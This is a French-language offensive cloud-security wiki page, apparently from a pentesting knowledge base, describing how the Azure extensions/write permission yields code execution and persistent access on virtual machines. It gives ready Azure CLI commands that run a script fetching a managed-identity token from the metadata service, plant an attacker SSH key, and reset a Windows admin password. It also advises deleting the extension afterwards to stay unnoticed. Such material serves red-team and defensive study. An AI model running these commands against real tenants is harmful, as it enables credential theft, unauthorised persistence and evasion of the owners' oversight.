---
title: "Custom Script Extension : exécution de code via extensions/write"
order: 2
description: "Exécuter du code sur une VM Azure en écrivant une Custom Script Extension ou une extension VMAccess via extensions/write."
keywords:
  - custom script extension
  - VMAccess
  - extensions write
  - VM
  - exécution de code
---

# Custom Script Extension

`Microsoft.Compute/virtualMachines/extensions/write` installe une extension que l'agent invité exécute en tant que SYSTEM ou root. La **Custom Script Extension** télécharge et exécute un script arbitraire ; l'extension **VMAccess** réinitialise le mot de passe de l'administrateur local ou la clé SSH, offrant un accès interactif. C'est un droit distinct de run command, de sorte qu'un principal privé de l'un détient souvent encore l'autre.

## Custom Script Extension

```bash
az vm extension set -g <rg> --vm-name <vm> \
  --name CustomScript --publisher Microsoft.Azure.Extensions \
  --settings '{"commandToExecute":"id && curl -s -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}'
```

## VMAccess : réinitialiser l'accès

```bash
# Linux: set a new user/key
az vm extension set -g <rg> --vm-name <vm> \
  --name VMAccessForLinux --publisher Microsoft.OSTCExtensions \
  --protected-settings '{"username":"att","ssh_key":"ssh-ed25519 AAAA..."}'
# Windows equivalent: az vm user update -g <rg> -n <vm> -u admin -p 'Newpass123!'
```

## Notes d'exploitation

- Même état final que [run command](run-command.md) ; choisissez l'action que votre rôle autorise.
- VMAccess est la voie plus discrète vers une ouverture de session interactive durable quand vous voulez une session plutôt qu'une exécution unique.
- Une extension est une ressource visible sur la VM ; supprimez-la après usage si la discrétion compte.

## Outils

- **Azure CLI** (`az vm extension set`).
- **MicroBurst** : exécution de commandes sur VM et utilitaires d'extensions.

## Références

- [Microsoft : Custom Script Extension pour Linux](https://learn.microsoft.com/azure/virtual-machines/extensions/custom-script-linux)
- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
- [HackTricks Cloud : Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
